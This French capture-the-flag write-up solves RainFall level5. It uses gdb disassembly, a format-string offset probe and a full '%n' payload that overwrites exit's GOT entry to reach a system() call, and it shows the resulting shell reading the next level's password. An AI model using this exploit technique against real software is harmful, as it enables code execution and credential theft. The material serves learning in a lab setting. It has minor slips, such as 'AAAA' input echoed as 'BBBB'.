(gdb) disass n
Dump of assembler code for function n:
   0x080484c2 <+0>:	push   %ebp
   0x080484c3 <+1>:	mov    %esp,%ebp
   0x080484c5 <+3>:	sub    $0x218,%esp
   0x080484cb <+9>:	mov    0x8049848,%eax
   0x080484d0 <+14>:	mov    %eax,0x8(%esp)
   0x080484d4 <+18>:	movl   $0x200,0x4(%esp)
   0x080484dc <+26>:	lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:	mov    %eax,(%esp)
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:	lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:	mov    %eax,(%esp)
   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
   0x080484f8 <+54>:	movl   $0x1,(%esp)
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
End of assembler dump.
(gdb) disass o
Dump of assembler code for function o:
   0x080484a4 <+0>:	push   %ebp
   0x080484a5 <+1>:	mov    %esp,%ebp
   0x080484a7 <+3>:	sub    $0x18,%esp
   0x080484aa <+6>:	movl   $0x80485f0,(%esp)
   0x080484b1 <+13>:	call   0x80483b0 <system@plt>
   0x080484b6 <+18>:	movl   $0x1,(%esp)
   0x080484bd <+25>:	call   0x8048390 <_exit@plt>
End of assembler dump.


On observe la presence de fonctions @plt ainsi que d'une fonction o contenant un appel a system.
La PLT (Procedure Linkage Table), est une table servant a faire le lien avec les fonctions situes dans une bibliotheque dynamique. Une fonction PLT aura une adresse
differente pre-run et post-run (observable via un disass pre puis post)
La PLT va ensuite ce "servir" de la GOT pour avoir acces a exit.
Nous allons ici changer l'adresse de la GOT du exit de la fonction n par celle de la fonction o et ainsi avoir acces a system.
D'abord trouvons l'adresse nous interressant grace a objdump -R level5
08049838 R_386_JUMP_SLOT   exit
Ici nous allons donc changer l'adresse contenue dans 0x8049838 (pre-run de exit@plt) par celle de la fonction o contenant un appel a system.

Cet exercice est similaire au precedent, d'abord on trouve offset

level5@RainFall:~$ python -c 'print "AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x"' | ./level5
BBBB 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520

Une fois l'offset trouvÃ©, il nous reste plus qu'a mettre en place notre exploit.
On utilisera ici l'adresse de o sous forme decimale : 0x080484a0 -> 134513824

level5@RainFall:~$ (python -c 'print("\x38\x98\x04\x08" + "%134513824d%4$n")'; cat) | ./level5 | tr -d " "
whoami
level6
pwd
/home/user/level5
cd ..
cd level6
cat .pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
